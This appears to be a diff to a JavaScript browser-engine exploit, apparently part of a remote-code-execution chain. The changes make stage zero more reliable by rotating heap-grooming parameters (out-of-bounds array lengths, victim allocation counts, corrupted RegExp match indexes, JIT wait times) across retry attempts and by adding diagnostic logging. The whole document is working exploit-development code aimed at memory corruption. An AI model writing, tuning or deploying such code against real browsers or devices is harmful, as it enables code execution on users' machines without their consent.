@@ -7036,8 +7036,22 @@ const device_chipset = {
 
     start() {
         this.lastFailure = "";
+        const attempt_idx = Number(globalThis.__bb_rce_attempt_idx || 0);
+        const stage0_variants = [
+            { target_length: 32, magic_tail: 128636, victim_allocations: 50, wait_extra: 0 },
+            { target_length: 33, magic_tail: 128636, victim_allocations: 50, wait_extra: 100 },
+            { target_length: 31, magic_tail: 128636, victim_allocations: 50, wait_extra: 100 },
+            { target_length: 34, magic_tail: 128637, victim_allocations: 50, wait_extra: 200 },
+            { target_length: 32, magic_tail: 128635, victim_allocations: 50, wait_extra: 200 },
+            { target_length: 35, magic_tail: 128638, victim_allocations: 56, wait_extra: 300 },
+            { target_length: 30, magic_tail: 128634, victim_allocations: 56, wait_extra: 300 },
+            { target_length: 36, magic_tail: 128639, victim_allocations: 64, wait_extra: 400 },
+            { target_length: 32, magic_tail: 128640, victim_allocations: 64, wait_extra: 500 },
+            { target_length: 37, magic_tail: 128636, victim_allocations: 64, wait_extra: 600 },
+        ];
+        const stage0_variant = stage0_variants[attempt_idx % stage0_variants.length];
         const victim_array_allocation_size = (0x120>>3);
-        const victim_array_allocations_in_page = 50;
+        const victim_array_allocations_in_page = stage0_variant.victim_allocations;
         var victim_cursor = 0;
 
         const egg1 = 0x5f2893ab;
@@ -7086,7 +7100,7 @@ const device_chipset = {
         for(let i = 1; i < 31; i++){
             the_oob_object[i] = 1.1;
         } //object should have 0x1e(30) items loaded, we want to overwrite +0x25(37)
-        const oob_object_target_length = 32;
+        const oob_object_target_length = stage0_variant.target_length;
         the_oob_object.length = oob_object_target_length;
         const holes_to_add = (oob_object_target_length - 30);
 
@@ -7160,7 +7174,7 @@ const device_chipset = {
             let regexp = new otherGlobalObject.RegExp('a', 'g');
             let a = new otherGlobalObject.String('a');
             let newmagic = a.match(regexp);
-            let magic_indexes = new otherGlobalObject.Array(498, 1003, 2008, 4018, 8038, 16078, 32158, 64318, 128636); 
+            let magic_indexes = new otherGlobalObject.Array(498, 1003, 2008, 4018, 8038, 16078, 32158, 64318, stage0_variant.magic_tail); 
             for (let i of magic_indexes) { 
                 newmagic[i] = 1;
             }
@@ -7173,9 +7187,8 @@ const device_chipset = {
         otherGlobalObject.dontjitme_contigious();
         dontjitme_float();
 
-        const attempt_idx = Number(globalThis.__bb_rce_attempt_idx || 0);
-        const jit_wait_ms = wait_for_jit_compilation_ms + Math.min(attempt_idx, 4) * 250;
-        print(`stage0 setup: attempt=${attempt_idx + 1} jit_wait_ms=${jit_wait_ms} victim_cursor=${victim_cursor} holes_to_add=${holes_to_add}`);
+        const jit_wait_ms = wait_for_jit_compilation_ms + Math.min(attempt_idx, 9) * 250 + stage0_variant.wait_extra;
+        print(`stage0 setup: attempt=${attempt_idx + 1} variant=${attempt_idx % stage0_variants.length} jit_wait_ms=${jit_wait_ms} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} holes_to_add=${holes_to_add} magic_tail=${stage0_variant.magic_tail}`);
 
         return sleep(jit_wait_ms).then(() => {
 
@@ -7205,7 +7218,7 @@ const device_chipset = {
                     }
                 }
                 if(oob_array_idx === undefined){
-                    this.failStage("stage0", `no oversized victim array after splice; victim_cursor=${victim_cursor} threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
+                    this.failStage("stage0", `no oversized victim array after splice; variant=${attempt_idx % stage0_variants.length} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} holes_to_add=${holes_to_add} magic_tail=${stage0_variant.magic_tail} threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
                     return false;
                 }
                 oob_array = victim_list[oob_array_idx];
@@ -7217,7 +7230,7 @@ const device_chipset = {
                     }
                 }
                 if(overlap_array_idx === undefined){
-                    this.failStage("stage0", `oversized victim found but egg scan failed; oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
+                    this.failStage("stage0", `oversized victim found but egg scan failed; variant=${attempt_idx % stage0_variants.length} oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
                     return false;
                 }
                 this.oob_array = oob_array;
